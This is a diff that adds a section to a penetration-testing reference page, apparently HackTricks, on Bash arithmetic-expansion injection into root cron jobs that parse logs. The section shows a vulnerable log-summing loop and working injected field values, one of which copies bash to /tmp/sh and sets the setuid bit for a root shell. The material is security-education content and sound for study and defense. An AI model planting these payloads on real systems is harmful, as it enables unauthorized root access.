@@ -416,6 +416,30 @@ Read the following page for more wildcard exploitation tricks:
 wildcards-spare-tricks.md
 {{#endref}}
 
+
+### Bash arithmetic expansion injection in cron log parsers
+
+Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.
+
+- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.
+
+- Typical vulnerable pattern:
+  ```bash
+  #!/bin/bash
+  # Example: parse a log and "sum" a count field coming from the log
+  while IFS=',' read -r ts user count rest; do
+      # count is untrusted if the log is attacker-controlled
+      (( total += count ))     # or: let "n=$count"
+  done < /var/www/app/log/application.log
+  ```
+
+- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
+  ```bash
+  # Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
+  $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
+  # When the root cron parser evaluates (( total += count )), your command runs as root.
+  ```
+
 ### Cron script overwriting and symlink
 
 If you **can modify a cron script** executed by root, you can get a shell very easily:
@@ -1682,6 +1706,7 @@ android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
 - [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
 - [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
-
+- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
+- [GNU Bash Reference Manual – Shell Arithmetic](https://www.gnu.org/software/bash/manual/bash.html#Shell-Arithmetic)
 
 {{#include ../../banners/hacktricks-training.md}}
